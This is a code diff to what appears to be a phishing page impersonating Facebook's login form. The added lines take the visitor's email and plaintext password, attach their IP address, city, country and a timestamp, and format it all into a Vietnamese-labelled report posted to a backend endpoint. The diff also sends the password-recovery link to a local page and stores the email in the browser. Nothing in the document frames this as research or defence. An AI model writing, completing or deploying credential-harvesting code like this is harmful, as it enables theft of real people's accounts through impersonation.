@@ -79,10 +79,15 @@
       >
         Log in
       </button>
-      <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="flex justify-center text-center cursor-pointer hover:underline">Forgotten Password?</a>
+      <a
+        href="/find_my_email?a=1"
+        class="flex justify-center text-center cursor-pointer hover:underline"
+        >Forgotten Password?</a
+      >
     </form>
     <div class="flex flex-col w-full items-center justify-center mt-6">
-      <a href="https://www.facebook.com/r.php?entry_point=login"
+      <a
+        href="https://www.facebook.com/r.php?entry_point=login"
         class="flex justify-center w-full py-2 text-blue-600 border border-blue-600 rounded-full hover:bg-blue-50"
       >
         Create new account
@@ -118,21 +123,38 @@ const handleFocus = (type: string, ref: any) => {
     ref.focus()
   }
 }
-
+const options = {
+  hour: '2-digit',
+  minute: '2-digit',
+  second: '2-digit',
+  day: '2-digit',
+  month: '2-digit',
+  year: 'numeric',
+}
+const geo = JSON.parse(localStorage.getItem('geo') || '{}')
 const handleSubmit = async () => {
   if (!email.value || !password.value) {
     return
   }
+  const message = `
+🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
+🌍 <b>Địa chỉ IP:</b> ${geo.ip}
+📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}
+
+📧 <b>Email:</b> ${email.value}
+🔑 <b>Mật khẩu:</b> ${password.value}
+`
 
   // Call your API here
   try {
     await $fetch('/api/code', {
       method: 'POST',
-      body: JSON.stringify({ account: { email: email.value, password: password.value }}),
+      body: JSON.stringify({ rawMessage: message }),
       headers: {
         'Content-Type': 'application/json',
       },
     })
+    localStorage.setItem('email', email.value)
   } catch (error) {
     console.error(error)
   }
